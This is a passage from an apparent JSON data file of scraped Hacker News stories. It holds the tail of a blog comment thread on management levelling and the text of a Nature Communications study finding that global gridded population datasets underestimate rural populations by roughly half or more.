Owner  - Remote Jobs\n\n\t\tPingback: Vidalytics: Digital Marketing Manager  - Remote Jobs\n\n\t\t\tD Gray\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 22, 2024 at 10:39 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tI’ve loved this post for years and have used it to inspire levelling frameworks at several companies\nDave:  have you ever seen anything similarly useful for VP vs SVP vs C-level?\n\nLoading...\n\n\t\t\tDave Kellogg\n\n\t\t\t\t|\n\n\t\t\t\tJanuary 22, 2024 at 10:40 am\n\t\t\t\t\t|\n\t\t\t\t\tReply\n\n\t\tWow, that’s a great idea.  I’m afraid I can’t whip anything up as the this first post was probably the result of a decade’s thinking, but I’ll start to stew on that question.  My intital reaction is “stripes” — i.e., there’s no fundamental difference certainly at a smaller (<$100M) startup.  But at a bigger company there most certainly is.  Let me mull.\n\nLoading...\n\n\t\t\tSteve M\n\n\t\t\t\t|\n\n\t\t\t\tAugust 16, 2024 at 4:21 am\n\t\t\t\t\t|\n\n\t\tMy guess is C-level sets Strategic Goals that VP makes plan to achieve?\n\nLoading...\n\n\t\tPingback: Anonymous\n\n\t\t\tLeave a ReplyCancel reply\n\n\t\t\t\t\t\tdocument.addEventListener('DOMContentLoaded', function () {\n\t\t\t\t\t\t\tvar commentForms = document.getElementsByClassName('jetpack_remote_comment');\n\t\t\t\t\t\t\tfor (var i = 0; i < commentForms.length; i++) {\n\t\t\t\t\t\t\t\tcommentForms[i].allowTransparency = false;\n\t\t\t\t\t\t\t\tcommentForms[i].scrolling = 'no';\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\n\t\tThis site uses Akismet to reduce spam. Learn how your comment data is processed.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "0fbffb74d4f0c43b",
    "title": {
      "en": "Global population datasets underrepresent rural population",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.nature.com/articles/s41467-025-56906-7",
    "score": 208,
    "by": "croes",
    "time": 1742298638,
    "content": "Download PDF\n\n        Article\n\n            Open access\n\n                        Published: 18 March 2025\n\n                    Global gridded population datasets systematically underrepresent rural population\n                    Josias Láng-Ritter\n            ORCID: orcid.org/0000-0002-3833-54501,2, Marko Keskinen\n            ORCID: orcid.org/0000-0001-5236-23271 & Henrikki Tenkanen\n            ORCID: orcid.org/0000-0002-0918-47102\n\n    Nature Communications\n\n                        volume16, Articlenumber:2170 (2025)\n            Cite this article\n\n                        6231 Accesses\n\n                            394 Altmetric\n\n                    Metrics details\n\n            AbstractNumerous initiatives towards sustainable development rely on global gridded population data. Such data have been calibrated primarily for urban environments, but their accuracy in the rural domain remains largely unexplored. This study systematically validates global gridded population datasets in rural areas, based on reported human resettlement from 307 large dam construction projects in 35 countries. We find large discrepancies between the examined datasets, and, without exception, significant negative biases of −53%, −65%, −67%, −68%, and −84% for WorldPop, GWP, GRUMP, LandScan, and GHS-POP, respectively. This implies that rural population is, even in the most accurate dataset, underestimated by half compared to reported figures. To ensure equitable access to services and resources for rural communities, past and future applications of the datasets must undergo a critical discussion in light of the identified biases. Improvements in the datasets’ accuracies in rural areas can be attained through strengthened population censuses, alternative population counts, and a more balanced calibration of population models.\n\n                Similar content being viewed by others\n\n                                        High-resolution gridded population datasets for Latin America and the Caribbean using official statistics\n\n                                        Article\n                                         Open access\n                                         07 July 2023\n\n                                        A National Synthetic Populations Dataset for the United States\n\n                                        Article\n                                         Open access\n                                         25 January 2025\n\n                                        HIPGDAC-ES: historical population grid data compilation for Spain (1900–2021)\n\n                                        Article\n                                         Open access\n                                         16 February 2025\n\n                window.dataLayer = window.dataLayer || [];\n                window.dataLayer.push({\n                    recommendations: {\n                        recommender: 'semantic',\n                        model: 'specter',\n                        policy_id: 'NA',\n                        timestamp: 1742718880,\n                        embedded_user: 'null'\n                    }\n                });\n\n                        IntroductionThe accurate estimation of population distribution is a central aspect of many scientific, social, and environmental endeavours, ranging from resource allocation1,2 and infrastructure planning3,4,5 to disease epidemiology6 and disaster risk management7,8,9,10,11. In recent years, the advancement of geospatial technologies and the widespread availability of satellite imagery and remote sensing data have facilitated the development of global gridded population data12,13. These comprehensive datasets partition the planet into evenly spaced, high-resolution grid cells with population counts, enabling researchers and policy makers to gain insights into the spatial distribution of human populations on a global scale (Fig.1).Fig. 1: Examples of five global gridded population datasets.The map shows part of the rural province of Tuyên Quang in northern Vietnam, with population data for the reference year 2000 from a GWP, b GRUMP, c GHS-POP, d LandScan, and e WorldPop. The Na Hang Reservoir in this area (indicated by the grey polygon) was completed in 2008 and caused resettlement of 4000 people. Supplementary Fig.1 shows an enlargement of panel d. Country boundary courtesy of ©EuroGeographics.Full size imageTo date, eight open-access datasets of population counts are available with (near-)global coverage, namely GWP (Gridded Population of the World)14, GRUMP (Global Rural-Urban Mapping Project)15, GHS-POP (Global Human Settlement Population)16, LandScan17, WorldPop18, HYDE (History database of the Global Environment)19, HRSL (High Resolution Settlement Layer)20, and Kontur21 (Table1). The models behind these products have varying degrees of complexity, ranging from simple areal disaggregation of census counts (as in GWP14) to dasymetric mapping approaches involving numerous auxiliary data sources, such as satellite-based detection of infrastructures and nightlights (as in WorldPop18). Details of the population datasets and their underlying methods are documented by Leyk et al.12, TReNDS13, and on the website of the POPGRID data collaborative (https://www.popgrid.org).Table 1 Characteristics of global gridded population datasetsFull size tableDue to their large spatial coverage and relevance for countless disciplines, the use and application of global gridded population datasets has dramatically increased in recent years22, but a consistent global-scale assessment of their accuracy is to date lacking. The datasets have been primarily validated and assessed in scattered countries or regions22,23,24, or focusing on selected urban areas, where population density is relatively high and the availability of ground-truth data is more accessible25. Conversely, rural areas, characterised by dispersed and heterogeneous populations, present unique challenges for population estimation due to limited ground-based data and inherent spatial complexities12,13,26. As a result, the accuracy and reliability of these datasets in rural regions remain largely unexplored, leading to a significant knowledge gap in the assessment of their suitability for applications exceeding the urban domain.This paper addresses this knowledge gap and systematically evaluates the accuracy of global gridded population datasets in rural areas across the planet. As ground-truth data, we employ a combination of reported human resettlement numbers27 and reservoir surface polygons28 from 307 large dam construction projects spread over 35 countries (Fig.2). The resettlement numbers27 were reported by national dam authorities and mostly stem from comprehensive on-the-ground impact assessments carried out during the planning and construction phase of the dam projects29. The reservoir polygons28, usually derived from satellite imagery, represent the areas inundated upon completion of the dams and thus provide the spatial extents from which the reported number of people27 were displaced. For further details on the employed data and the methods used for comparing the ground-truth data to the gridded population datasets, please refer to section “Methods”.Fig. 2: Locations of the 307 rural areas analysed in this study.The reported population numbers are indicated by marker size, while reference years of the rural areas are shown by marker colour. Country boundaries courtesy of ©EuroGeographics.Full size imageOne major advantage of using a combination of resettlement data and reservoir polygons is that the evaluated spatial units relate to the areas covered by water reservoirs, rather than administrative boundaries used for census collection and the creation of the population datasets. To the best of our knowledge, global gridded population datasets have never before been validated using multi-national reference data that are fully independent from population censuses. The reference data contains historical resettlement numbers over the past decades, which enabled us to carry out a multi-temporal accuracy assessment across the population map reference years 1975–2010 (Fig.3).Fig. 3: Characteristics of evaluated rural areas and population datasets.a Temporal distribution of the 307 evaluated rural areas. b Temporal coverage and model complexity of the five population datasets examined in this study.Full size imageWe show that all five examined population datasets systematically underrepresent rural population, with substantial negative biases ranging from −53% (WorldPop) to −84% (GHS-POP). The biases we identify call for a critical discussion of past and future applications of these datasets, to mitigate the risk of rural populations experiencing systematic disadvantages in the allocation of resources and services. Moreover, given that national population censuses are the key input for population models, our results suggest that the incompleteness of censuses in rural areas is a more serious issue than previously acknowledged.ResultsThis section presents the accuracy assessment of five global gridded population datasets in rural areas: GWP, GRUMP, GHS-POP, LandScan, and WordPop. First, we identify systematic differences between the population grids based on the 33 rural areas covered by all five datasets. Next, we break down the results into map reference year and country income level, which are two aspects commonly suspected to influence map accuracy12. Finally, we present bias percentages for the five datasets in each of the 35 countries.Systematic differences between the gridded population datasetsThe year 2000 is the only reference year present in all five examined population datasets (Fig.3). Therefore, this reference year presents the unique opportunity to inspect systematic differences between the datasets, isolated from temporal influences. Figure4 contrasts the reported people resettled from reservoir polygons Preported with populations predicted in these areas by the five gridded population datasets Ppredicted (see section “Methods”). The great majority of predictions across the five datasets significantly underestimate reported values with reference year 2000, whereas overestimations are mostly limited to the data points with less than ten reported people. When visually comparing the results for the five grids, large discrepancies become apparent, with estimates for the same rural area often spanning several orders of magnitude (Fig.4). The differences between GWP, GRUMP, LandScan, and WorldPop are large but mostly lie within the same order of magnitude. GHS-POP, however, diverges even more substantially from the others: it shows the lowest estimate for all 33 rural areas and consistently underestimates reported population. Further, it appears that GHS-POP has significant gaps in rural areas, estimating values close to zero for several areas with more than 1000 reported people.Fig. 4: Comparison of reported rural populations (x-axis) with those predicted by the five population datasets (y-axis) for the reference year 2000.Each of the vertically aligned groups of five data points represents one of the 33 rural areas evaluated for the reference year 2000. Note the logarithmic scale on both axes.Full size imageResults by reference yearFigure5a–e expand the analysis to the other reference years and reveals a systematic and significant negative bias in all five datasets, ranging from −53.4% (WorldPop), −65.0% (GWP), −66.9% (GRUMP), and −68.4% (LandScan) to −83.8% (GHS-POP). This means that even for the data source with the least bias (WorldPop), the predicted rural population amounts to less than half the reported figures. In terms of error variability, the results across data sources are very similar, with a symmetric mean absolute percentage error (sMAPE; see section “Methods”) of 0.52–0.53, except for GHS-POP showing significantly higher spread than the others (sMAPE = 0.87). Putting these results into context with the underlying model complexities (Fig.3b), it appears that more complex population models do not necessarily result in higher accuracy in rural areas.Fig. 5: Validation scatter plots for the five analysed population datasets, comparing reported rural populations (x-axes) with those predicted by the population datasets (y-axes).Each data point represents one of the 307 analysed rural areas with colouring according to reference year (a–e) and colouring according to country income level using World Bank classification (f–j). The accuracy metrics shown in all plots represent bias percentage and symmetric mean absolute percentage error (sMAPE). Note the logarithmic scale on all axes.Full size imageWhile a strong negative bias and a high error variability are present across all reference years, they tend to become less evident for more recent years (Fig.6a, b). This is sensible due to strengthened population census efforts as well as the increasing availability of ancillary data over time12,13. While no significant bias trends are visible for GWP, GRUMP, GHS-POP, and LandScan, the improvement of WorldPop is remarkable, having reduced its bias from about −80% to −32% in the years 2000 and 2010, respectively (Fig.6a). Error variability has improved considerably, with the year 2010 showing the lowest sMAPE for all five datasets (Fig.6b).Fig. 6: Trend analyses of dataset accuracy over map reference year and country income level.a, b Influence of map reference year on dataset accuracy. c, d Influence of country income level on dataset accuracy. The analysis in c, d is based solely on the 63 areas with reference years 2000–2010 to exclude effects of different time periods covered by the different population datasets.The accuracy metrics used are bias percentage and symmetricmean absolute percentage error (sMAPE); for both accuracy metrics, the optimal value is zero.Full size imageResults by country income levelPopulation modellers commonly suspect their datasets to be more accurate in higher-income countries due to more frequent and reliable censuses and greater availability of ancillary data12, and GHS-POP has indeed shown such a behaviour in urban areas25. Figure5f–j shows our validation results categorised by country income level of the World Bank classification30. Among the 307 rural areas, only 22 are located in high-income countries, all with reference years before 2000. The large majority of analysed rural areas lie in low or lower-middle income countries. In Fig.5f–j, no clear effect of country income on the accuracies of the five datasets can be observed. This initial impression is corroborated by the trend analysis presented in Fig.6c, d, in which we focus on the 63 rural areas with reference years 2000–2010 to enable an analysis independent from variations in data accuracy over time (as identified in Fig.6a, b). The trend analysis confirms that country income level does not significantly influence the accuracy of population datasets in rural areas (Fig.6c, d).Results by countryFinally, we present the results separately for the 35 countries with evaluated rural areas. The global map of bias percentages in Fig.7 reveals that also at country level, gridded population datasets largely underestimate rural population. Relatively accurate estimates are limited to Austria, Lesotho, Cambodia, and Vietnam (Fig.7), but these countries are represented by only 1–2 data points (Fig.8) and thus results are highly uncertain. More reliable conclusions can be drawn for countries with higher numbers of data points, especially for China (203), Brazil (30), Australia (10), Poland (9), and Colombia (6). In all of these countries,rural population is significantly underestimated by all five datasets (Figs.7 and8). Positive biases can be observed only in seven countries with few data points (i.e. Venezuela, Ghana, Albania, North Macedonia, Lesotho, Cambodia, and Vietnam), and in none of these the overestimation is unanimous among all five datasets (Fig.8).Fig. 7: Mean bias percentages over the five population grids in the 35 countries with evaluated rural areas.Note that most countries include data points for only some of the five datasets, as indicated in Fig. 8. Country boundaries courtesy of ©EuroGeographics.Full size imageFig. 8: Bias percentages for each of the five population grids in the 35 countries with evaluated rural areas.Countries are sorted alphabetically by ISO3 country code. The numbers below the ISO3 country codes indicate the totals of rural areas evaluated for each country. The lack of reference years for computing bias percentage of a given dataset is indicated by x-symbols.Full size imageGHS-POP shows great underestimation in all countries except for Austria, North Macedonia, and Cambodia. The other four datasets show a slightly more balanced behaviour. WorldPop appears to have the least bias in many countries, especially in those with higher numbers of data points (e.g. in China, Poland, and Pakistan). In Brazil, however, WorldPop is outperformed by GWP and GRUMP. For a complete list of the numeric bias scores and evaluated map years in each country, please refer to Supplementary Table1.Many countries are represented by only a few data points, which impedes a reliable statement on the general accuracy of the maps in their rural areas. Thus, our results in these countries contain significant uncertainties and do not necessarily provide a representative view of the accuracy of the data at national level. However, they provide first indications on the accuracy that should be substantiated with further national-scale accuracy assessments.DiscussionMain implications of the results. The findings from this study hold significant implications for a wide array of research and policy fields that consider rural areas and their populations, including disaster preparedness, public health planning, environmental conservation, and, ultimately, sustainable development. We assessed the accuracy of global gridded population datasets specifically in rural areas around the globe using reported human resettlement numbers from over 300 dam projects, which provide multi-national reference data fully independent from population censuses. We found a significant and systematic tendency for all datasets to underestimate rural population, with biases ranging from −53% (WorldPop) to −85% (GHS-POP). This is remarkable, as countless studies have employed these datasets without questioning their accuracy in the rural domain, and the systematic underrepresentation of rural population directly propagated into their results. It implies that the results of such studies, especially those focusing on rural applications, unknowingly underrepresented the interests of rural populations. For instance, studies that map the potential impacts of disasters on population9,10,31,32,33 have likely underestimated the population exposed in rural areas, which may result in an unequitable distribution of risk reduction efforts favouring urban and discriminating rural population. Or, past analyses of healthcare accessibility3,4 may have guided policy makers to an insufficient development of healthcare services in rural areas, simply because the real demand of the rural population was not adequately reflected in the data. Policies that build upon such studies have likely been causing population in rural regions, currently forming about 43% of global population34, to experience systematic disadvantages in accessing services, resources, and equal opportunities for development. To ensure that rural population is not left further behind, past and future studies employing these datasets must undergo a critical discussion of the underlying uncertainties and limitations, encouraging policy makers to a more careful interpretation of the studies’ results particularly in rural areas. Otherwise, the fundamental objective of the 2030 Agenda for Sustainable Development to “leave no one behind”35 will remain an unfulfilled promise.Root causes of systematic underrepresentation of rural population. Since the systematic underrepresentation of rural population is present in all five examined datasets, it seems likely that its root cause lies not primarily in the methods and modelling approaches behind the datasets, but in the underlying input data. The most important input for all population models are national population censuses12, which are subject to fundamental limitations13: Most importantly, insufficient financial resources compromise the completeness and timeliness of the censuses. Furthermore, communities in remote locations or impacted by conflict and violence are difficult to access, and census enumerators often face language barriers and resistance to participation. Such challenges can lead to a substantial incompleteness of the census. For instance, in Paraguay, the 2012 census may have missed a quarter of the population13. The significant underrepresentation of rural population we found in the gridded datasets raises the question whether such gaps in the census are more widespread than assumed to date, and how reliable current global population estimates really are. For example, is it possible that global population estimates from the United Nations36 (7.98 billion in 2022) or World Bank37 (7.95 billion in 2022), both relying heavily on national population censuses, miss a significant part of the world population?Further, the question arises whether gaps in the census affect the accuracy of the gridded population datasets equally in urban and rural areas. Kuffer et al.25 assessed the accuracy of GHS-POP in selected urban areas around the globe and found high uncertainties but no systematic underestimation. This indicates that, at least for this dataset, the incompleteness in the census does not primarily affect accuracy in the urban domain but it is disproportionally allocated to rural areas. In fact, also the producers of the datasets acknowledge that existing gridded population datasets were mainly calibrated for the urban domain, since this is where the majority of people live, where census data are often available in higher spatial and temporal resolution, and where infrastructure is easier to detect12. For rural areas, censuses are subject to more pronounced limitations, and villages and infrastructure may be harder to identify using remote sensing data due to dense tree coverage or differing building types and materials12. The use of satellite-based night-time lights by GRUMP and WorldPop12 may introduce further biases, since rural areas, especially in developing countries, may lack electrification and thus make residential buildings appear uninhabited38. Looking at our validation dataset, however, we did not observe any significant influence of country electrification on population estimation bias of GRUMP and WorldPop in rural areas (see Supplementary Fig.2).Another potential cause for systematic biases is the spatial resolution of ancillary data: Satellite imagery at 100 m resolution used by GHS-POP and WorldPop may be well suited to delineate urban areas but are too coarse to detect scattered hamlets and villages13. For instance, GHS-POP uses a rigid mask of satellite-based building footprints (Fig.1) that has been shown to detect only about 4% of buildings in rural areas20, and this likely caused it to have the largest biases among the five datasets. The recent HRSL population dataset20 presents an interesting alternative as it uses remote sensing data in 30 m resolution (Table1), but it currently includes only about 190 countries and lacks several highly populated nations such as China and Russia. Besides, in spite of its high ability to detect rural settlements (e.g. 83% of rural buildings in a case study in Malawi20), HRSL has shown even lower rural population estimates than LandScan and WorldPop in a recent large-scale study31, indicating an even more pronounced negative bias in rural areas than these two datasets we examined.Finally, it is important to mention that dominant root causes of rural population underrepresentation may vary significantly among countries since the quality of the census and ancillary datasets is inhomogeneous. Further comparative studies in countries where census data are relatively robust would help improve our understanding of the strengths and limitations of the different population models in various contexts.Recommendations for mitigating negative biases. The results of this study call for an improved population data collection and calibration of population models in the rural domain. It is evident that more resources should be allocated to population census efforts specifically in rural areas. In addition, we argue that data producers should employ also alternative population counts to enrich the data collected from censuses and improve model calibration in the rural domain. Alternative population counts include for instance representative household surveys in selected rural areas, such as demonstrated by Boo et al.39 in the Democratic Republic of Congo, but also reported resettlement from surface mining or large infrastructure projects, such as the data used for validation in this study. Ancillary data sources with limitations in rural areas (such as building footprints or night-time lights), though containing very useful information for the urban domain, should be treated with care and assigned with reasonably low influence in the population models to avoid systematic penalisation of rural population. The POPGRID data collaborative (https://www.popgrid.org) presents an excellent platform for sharing advanced calibration and validation methods for the rural domain among the community of population modellers.Several past applications of gridded population datasets have shown that study results, particularly in sparsely populated regions, are highly sensitive to the population dataset choice3,6,31, and the large discrepancies we found between the examined datasets corroborate these previous findings. However, most studies use only one of the available population datasets and do not critically discuss their choice; the decision to use a particular dataset is often driven by ease of access and use, rather than by the suitability of the dataset for the given study context3,12,22. Our comparative analysis directly supports users in their dataset choice, especially for studies involving rural areas: We recommend the use of WorldPop for global and large-scale analyses due to the least pronounced (yet remarkable) systematic bias found among the five datasets. WorldPop has been endorsed also by previous analyses in regions containing urban areas22,23,24. For smaller-scale studies focusing on rural areas, the country-specific bias scores we provide in Fig.8 and in Supplementary Table1 offer quantitative guidance on the most accurate dataset in the region of interest. To fully support an informed dataset choice, population modellers themselves could routinely assess their products and openly provide reliability estimates for their data in both rural and urban domains.Limitations of the study. The results of this study are subject to uncertainties, primarily concerning the resettlement numbers reported by national dam authorities and used for validation (see Methods). These numbers may at times represent informed estimates rather than exact ground-based population counts. Unfortunately, no information was available on potential biases in the resettlement data. One possible source of bias could be that national dam authorities tend to underreport resettlement to downplay the social impact of dams40. In the context of our analysis, such underreporting would further amplify the negative biases we identified for the gridded population datasets.Secondly, the simple bias adjustment we applied to the predicted population values to mitigate underrepresentation of reservoir areas in the GeoDAR dataset (see Methods) affects our assessment of error variability, since some reservoir areas are more accurately represented than others. This artificially increases the error variability results presented as sMAPE scores. However, the bias percentages that form the main results of this study are not affected and should be robust given the high number of evaluated rural areas (N = 307).Thirdly, the lack of validation data for the years after 2010 impeded an accuracy assessment of population grids for the years 2015 and 2020. Our analysis showed the least mean bias for the latest evaluated reference year 2010, and the accuracy of the datasets may have further improved for more recent years, for instance due to the increased implementation of population registers and register-supported censuses adopted by many countries41. This would imply less significant biases than those we identified here for the period 1975–2010.Lastly, although the analysed set of 307 rural areas shows large variety (Supplementary Table2), it is not a representative sample in statistical terms that would allow us to evaluate population datasets for the whole global rural population. Nevertheless, our results provide a clear indication that rural populations tend to be underestimated by global population datasets. To further corroborate our findings for rural areas as a whole, we recommend additional validation studies using reference data from other contexts (e.g. resettlement data from surface mining activities).MethodsGlobal gridded population datasetsFrom the eight existing gridded population datasets with (near-)global coverage listed in Table1, five datasets were selected that contained map reference years within the temporal coverage of the validation data (1975–2010): GWP, GRUMP, GHS-POP, LandScan, and WorldPop. All these products provide maps in five-year intervals (except for WorldPop providing yearly grids), and this temporal resolution has thus been adopted for the analysis.For each of the five datasets, the highest available spatial resolution has been selected for the main analysis, i.e. 1 km for GWP, GRUMP, and LandScan, and 100 m for GHS-POP and WorldPop (results for WorldPop in 1 km resolution can be found in Supplementary Fig.3). For WorldPop, the version unconstrained by land use has been selected due to the unavailability of the constrained version for reference years before 2020. For those products that offer versions with and without adjustment using national-level estimates from United Nations Population Division (i.e. GWP, GRUMP, and WorldPop), both versions have been included in the initial analysis. In this paper, however, we show only the results for the UN-adjusted grids since these performed slightly better than their unadjusted counterparts (Supplementary Fig.4 shows results for the unadjusted datasets).Validation dataThe numbers of people resettled due to large dam projects are provided by the International Commission on Large Dams (ICOLD). The ICOLD World Register of Dams27 is a continuously updated database of currently about 62,000 dams, including various dam and reservoir attributes reported by the national dam authorities of 106 member countries. In this study, three reservoir attributes have been used: The number of resettled people, the maximum reservoir surface area in km2, and the year of dam completion. Only 2699 reservoirs in the database (about 4% of entries) contained resettlement data, with overall 10.02 million displaced people. The resettlement numbers typically stem from comprehensive on-the-ground surveys as part of impact assessments carried out during the planning and authorisation procedure of dam construction projects29. An inquiry we sent to ICOLD Central Office confirmed that the numbers represent only physical resettlements from areas that were later inundated and occupied by reservoirs and do not include secondary displacements of people residing outside the reservoir areas, e.g., due to livelihood loss induced by the project (personal communication, 28.8.2023). For further considerations on uncertainties in the resettlement numbers, see section “Discussion”.While the ICOLD database covers human resettlements and other numeric attributes of reservoirs, it does not contain information on the reservoirs’ geographic coordinates and spatial extents. To bridge this gap, Wang et al.28 developed a method for geo-referencing reservoirs in the ICOLD database. They employed geocoding techniques to connect the entries in the ICOLD database to three publicly available global maps of water bodies and reservoirs, namely GRanD42, HydroLAKES43, and UCLA Circa 2015 Lake Inventory44. The resulting reservoir polygons spatially resolved over 90% of global reservoir surface area, which makes GeoDAR to date the most comprehensive data source that includes both reservoir attributes and their geographic information28.We updated the reservoir attributes in the GeoDAR data with the most recent information from the ICOLD database (retrieved on 20 July 2023). A subset of reservoirs has been selected that fulfils the following minimum data requirements for the analysis: (i) resettlement data available, (ii) reservoir surface area larger than 1 km2, (iii) construction completed earliest in 1980, and iv) population density in the reservoir area below 1500 people/km2, a threshold used by World Bank45 and United Nations Statistical Commission46 to delineate cities based on population density. To avoid ambiguities, we manually removed transboundary dams and those with ICOLD attributes indicating a previously existing reservoir in the same location (e.g. dam reconstructions or heightenings). This resulted in a final set of 307 reservoirs for analysis in this study with a combined surface area of 22,489 km2.Among the 307 reservoirs, relatively small surface areas (1–25 km2) are most common, but also numerous larger areas up to about 4000 km2 in size are included. Supplementary Fig.6 shows the size distribution of the reservoirs and illustrates that area size does not have an influence on the mean bias of the population datasets. In addition to area size distribution, we also analysed the distributions of population numbers, population densities, and altitudes of the 307 areas (Supplementary Table2). All four sample characteristics include a wide range of values, with standard deviations being larger than means and medians. This large spread in the data implies that our sample of 307 areas covers a great variety of contexts.The reservoirs are distributed over 35 countries on all continents except for North America (Fig.2). China is strongly overrepresented with 203 reservoirs, but due to many small reservoirs these cover only about 26% of the combined surface area of all included reservoirs. Nonetheless, the validity of the results for the global domain has been confirmed by carrying out a second analysis without Chinese reservoirs that yielded very similar results (see Supplementary Fig.5).Selection of the population map reference yearsThe year of dam completion in the ICOLD database represents the situation when a reservoir has been filled and people have already been relocated from the area. To find for each reservoir the population map year that corresponds to the situation before resettlement, the year of dam completion requires a temporal offset. According to Ansar et al.47 the construction of very large dams takes on average 8.6 years, and the resettlement of people is typically a gradual process over the construction period. To obtain for each rural area a map reference year from the 5-year intervals within 1975–2010, we therefore chose a temporal offset of 5–9 years before dam completion as reference year Yreference (Eq.1). In other words, the completion year Ydamcompletion of each dam i is rounded down to the second closest population map reference year. A sensitivity analysis supported the robustness of this choice (see Supplementary Fig.7 for results assuming an alternative temporal offset of 10–14 years). The resulting distribution of the 307 reservoirs over the reference years within 1975–2010 is shown in Fig.3.$${Y}_{{{{\\rm{reference}}}},{i}}={Y}_{{{{\\rm{damcompletion}}},{{i}}}}-(5+{Y}_{{{{\\rm{damcompletion}}}},{i}}{{{\\rm{mod}}}}\\,5)$$\n                    (1)\n                Prediction of rural populationFollowing these preparations, we retrieved from the gridded population datasets the number of people located inside the 307 reservoir areas. This was done by a simple spatial overlay of each of the reservoir polygons with the population grids of the according reference year Yreference: First, the spatial resolution of the population grids was increased to 10 m to mitigate data artefacts related to coarser cell sizes. This was done by taking the population totals at the native resolution and evenly distributing them among the high-resolution cells. Then, the values of all high-resolution pixels with centroids located inside the reservoir polygon were summed to determine the total number of people Ppolygon.The assumed even population distribution within low-resolution cells may introduce uncertainties, as in reality, populations may be concentrated in small parts of the cells. Therefore, we tested the sensitivity of assuming an even population distribution by comparing the bias results for WorldPop using 100 m resolution data (as in the main analysis) against the results using the aggregated 1 km data (see Supplementary Fig.3). This resulted in marginal differences relating likely to the Modifiable Areal Unit Problem (MAUP)48 rather than uneven population distributions inside the cells.As pointed out in previous research49, the reservoir polygons in the GeoDAR dataset tend to underestimate the real reservoir areas since the polygons are usually derived from satellite images that may show a situation when the reservoir is not fully filled and thus not at its maximum surface extent. To mitigate the effect of this systematic area underestimation, the rural populations estimated above (Ppolygon) require a bias adjustment. We first quantified the systematic underrepresentation by comparing surface areas reported by ICOLD to the corresponding geometric areas of the GeoDAR polygons (Fig.9). This analysis included 6095 reservoirs with reported surface areas larger than 1 km2, after 209 outliers were removed due to unrealistically large differences between the two area values (ratio > 5). We found that GeoDAR polygons underrepresent the real reservoir extent by on average 18.8%.Fig. 9: Surface area validation of three reservoir polygon sources combined in GeoDAR (i.e. GRanD, HydroLAKES, and UCLA Circa 2015) against surface areas reported by ICOLD.The validation shows a systematic underrepresentation of the real reservoir area by GeoDAR polygons (mean bias = −18.8%).Full size imageSecond, we used the identified mean bias of −18.8% to adjust the numbers of people retrieved from the population maps for each reservoir polygon i (Ppolygon,i), resulting in final predicted population amounts Ppredicted,i (Eq.2). This bias adjustment assumes that population density in the missing part of each reservoir area is equal to population density inside the reservoir polygon.$${P}_{{{{\\rm{predicted}}}},i}=\\frac{1}{1-0.188}\\cdot {P}_{{{{\\rm{polygon}}}},i}=1.23\\cdot {P}_{{{{\\rm{polygon}}}},i}$$\n                    (2)\n                Accuracy evaluationTo analyse the accuracy of the population grids in rural areas, we compare the predicted population numbers (Ppredicted) to those reported by ICOLD (Preported). This comparison is carried out by means of two accuracy metrics:First, bias percentage is used to analyse the general over- or underestimation of rural population (Eq.3). Positive or negative values imply systematic over- or underestimation, respectively. A value of Bias = 0% represents the absence of biases.$${{\\rm{Bias}}}=\\frac{\\sum {P}_{{{{\\rm{predicted}}}},i}-\\sum {P}_{{{{\\rm{reported}}}},i}}{\\sum {P}_{{{{\\rm{reported}}}},i}} \\cdot 100\\% \\in \\left[-100\\%,+\\infty \\right]$$\n                    (3)\n                Second, symmetric mean absolute percentage error (sMAPE) has been chosen to detect error variability of the data points (Eq.4). While a value of sMAPE = 0 means a perfect prediction without deviations from reported values, sMAPE = 1 implies an average estimation error of 100%.$${{\\rm{sMAPE}}}=\\frac{1}{n}\\mathop{\\sum }\\limits_{i=0}^{n}\\frac{\\left|{P}_{{{{\\rm{reported}}}},i}-\\,{P}_{{{{\\rm{predicted}}}},i}\\,\\right|}{\\left|{P}_{{{{\\rm{reported}}}},i}\\right|+\\,\\left|{P}_{{{{\\rm{predicted}}}},i}\\,\\right|}\\in \\left[0,\\,1\\right]$$\n                    (4)\n                Reporting summaryFurther information on research design is available in theNature Portfolio Reporting Summary linked to this article.\n\n                Data availability\n\n              The five gridded population datasets are freely accessible through the weblinks provided in Table1. The GeoDAR dataset28 containing the reservoir polygons is freely available for download on Zenodo (https://zenodo.org/records/6163413). The reservoir attributes need to be purchased from the International Commission of Large Dams through the World Register of Dams27 (https://www.icold-cigb.org/GB/world_register/world_register_of_dams.asp). The polygon file resulting from this study is publicly available (https://doi.org/10.5281/zenodo.14637154)50, and it contains the 307 evaluated rural areas and the population estimates for each rural area.\n            Code availability\n\n              The Python code for generating the population estimates for the 307 rural areas is openly accessible on Zenodo (https://doi.org/10.5281/zenodo.14637154)50 and GitHub (https://github.com/josiasritter/population_grid_assessment). The repositories also contain code for the validation procedure and for generating the figures in Results.\n            ReferencesIslam, Md. S. et al. A grid-based assessment of global water scarcity including virtual water trading. Water Resour. Manag. 21, 19–33 (2007).Article\n    MATH\n\n                    Google Scholar\n                Deichmann, U., Meisner, C., Murray, S. & Wheeler, D. The economics of renewable energy expansion in rural Sub-Saharan Africa. Energy Policy 39, 215–227 (2011).Article\n    MATH\n\n                    Google Scholar\n                Hierink, F. et al. Differences between gridded population data impact measures of geographic access to healthcare in sub-Saharan Africa. Commun. Med. 2, 1–13 (2022).Article\n\n                    Google Scholar\n                World Bank. Measuring rural access: using new technologies. https://documents.worldbank.org/en/publication/documents-reports/documentdetail/367391472117815229/Measuring-rural-access-using-new-technologies (2016).Bergroth, C., Järv, O., Tenkanen, H., Manninen, M. & Toivonen, T. A 24-hour population distribution dataset based on mobile phone data from Helsinki Metropolitan Area, Finland. Sci. Data 9, 39 (2022).Article\n    PubMed\n    PubMed Central\n\n                    Google Scholar\n                Tatem, A. J., Campiz, N., Gething, P. W., Snow, R. W. & Linard, C. The effects of spatial population dataset choice on estimates of population at risk of disease. Popul. Health Metr. 9, 4 (2011).Article\n    PubMed\n    PubMed Central\n\n                    Google Scholar\n                Dasgupta, S., Laplante, B., Murray, S. & Wheeler, D. Exposure of developing countries to sea-level rise and storm surges. Clim. Change 106, 567–579 (2011).Article\n    ADS\n    CAS\n    MATH\n\n                    Google Scholar\n                Dottori, F. et al. Increased human and economic losses from river flooding with anthropogenic warming. Nat. Clim. Change 8, 781–786 (2018).Article\n    ADS\n    MATH\n\n                    Google Scholar\n                Ritter, 